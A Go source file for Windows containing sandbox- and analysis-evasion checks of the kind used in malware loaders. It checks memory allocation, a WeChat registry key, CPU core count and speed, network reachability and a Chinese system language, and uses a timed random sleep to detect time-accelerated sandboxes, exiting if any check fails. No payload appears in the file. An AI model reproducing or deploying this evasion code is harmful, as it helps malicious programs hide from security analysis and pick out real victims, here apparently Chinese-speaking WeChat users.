package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"

	"runtime"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func detectSandbox() bool {

	memory, success := allocateMemory(120)
	if !success {
		return false
	}
	if !detectWeChatInstallation() {
		return false
	}
	if !detectCPUCores() {
		return false
	}
	if !detectCPUSpeed() {
		return false
	}

	if !detectNetwork() {
		return false
	}
	if !detectSystemLanguage() {
		return false
	}
	time.Sleep(3 * time.Second)
	releaseMemory(&memory)
	return true
}

func sandBoxMain() {
	// 执行环境检测
	log.Println("正在进行环境安全检测...")
	if !detectSandbox() {
		fmt.Printf("检测到虚拟环境，程序退出。")
		return
	}
	log.Println("环境检测通过，程序继续运行")
	if RandomSleep() == 0 {
		return
	}

	log.Println("系统初始化完成...")

}

func detectWeChatInstallation() bool {
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Tencent\WeChat`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()
	return true
}

func detectCPUCores() bool {
	cores := runtime.NumCPU()
	if cores < 4 {
		return false
	}
	return true
}

func detectCPUSpeed() bool {
	start := time.Now()
	for i := 0; i < 100000000; i++ {
		_ = i * i
	}
	duration := time.Since(start)
	if duration > time.Second {
		return false
	}
	return true
}

func detectNetwork() bool {
	conn, err := net.Dial("tcp", "8.8.8.8:53")
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func detectSystemLanguage() bool {
	languages, err := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if err != nil {
		return false
	}
	if len(languages) > 0 && languages[0] == "zh-CN" {
		return true
	}
	return false
}
func allocateMemory(sizeMB int) ([]byte, bool) {
	defer func() {
		if r := recover(); r != nil {
		}
	}()
	size := sizeMB * 1024 * 1024
	memory := make([]byte, size)

	for i := 0; i < len(memory); i++ {
		memory[i] = byte(i % 256)
	}
	return memory, true
}

func releaseMemory(memory *[]byte) {
	*memory = nil
}

func RandomSleep() int {
	startTime := time.Now()
	randomInt := rand.Intn(30)
	fmt.Print(randomInt)
	randomDuration := time.Duration(randomInt) * time.Second
	time.Sleep(randomDuration)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= randomDuration {
		return 1
	} else {
		return 0
	}
}
